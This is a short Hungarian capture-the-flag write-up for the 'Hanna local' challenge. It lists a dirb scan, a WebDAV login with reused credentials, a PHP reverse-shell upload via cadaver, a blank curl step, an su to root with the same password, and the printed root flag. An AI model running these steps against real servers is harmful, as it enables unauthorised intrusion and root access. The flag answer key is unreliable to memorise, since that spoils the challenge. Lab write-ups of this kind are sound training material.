# Hanna local

Segítenél Hannának? 10.10.(1-9).10:8081

Flag formátum: {HCSC}!...

Ehhez a feladathoz nem kell writeup!

valami toolal megtalalatam a webdav konyvtarat
dirb http://10.10.1.10:8081

a jelszo apollo:apollo13, ahogy azt mar megtanultuk

reverse shell feltoltese webdavra php-ban:
```
cadaver
dav:!> open http://10.10.4.10:8081/webdav
Authentication required for webdav on server `10.10.4.10':
Username: apollo
Password:
dav:/webdav/> put encse.php
Uploading encse.php to `/webdav/encse.php':
Progress: [=============================>] 100.0% of 5493 bytes succeeded.
dav:/webdav/>
```

utana:
curl 

utana:
```
su -c /usr/bin/sh root
Password: apollo13
ls /root
root_flag.txt
cat root_flag.txt
{HCSC}_r0otFl4g:4:H@nnA
```